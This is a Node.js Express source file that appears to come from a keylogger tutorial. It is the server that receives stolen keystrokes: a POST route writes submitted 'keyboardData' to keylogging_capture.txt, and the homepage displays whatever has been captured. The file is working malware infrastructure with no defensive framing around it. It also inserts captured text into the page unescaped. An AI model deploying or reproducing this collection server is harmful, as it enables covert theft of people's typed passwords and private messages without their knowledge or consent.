// Importing fs module for access to the file system.
const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");
// Creating the express app.
const app = express();
/* using bodyParser to access the body of your request.*/
app.use(bodyParser.json({extended: true}));
// Assigning port 8080.
const port = 8080;
// When a GET request is made to the "/" resource we return basic HTML.
app.get("/", (req, res) => {
    /* The GET request shows the data that's logged in the keyboard_capture.txt file.
    If the file keyboard_capture.txt has not yet been created, the try catch statement will
    throw an exception and log to the homepage that nothing's been logged yet.   
    */ 
    try {
        const kl_file = fs.readFileSync("./keylogging_capture.txt", {encoding:'utf8', flag:'r'});    
        // We send the txt file data to the server. We replace the "\n" with <br> 
        res.send(`<h1>Data has been logged...Check the file!</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
    } catch {
        res.send("<h1>Nothing has been logged yet. Give it another shot.</h1>");
    }  
});


app.post("/", (req, res) => {
    // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
    console.log(req.body.keyboardData);
    // Will now write the keyboard capture to a text file.
    fs.writeFileSync("keylogging_capture.txt", req.body.keyboardData);
    res.send("The data has been set successfully :)");
});
// We can see that the app is listening on which port.
app.listen(port, () => {
    console.log(`App is listening on port ${port}`);
});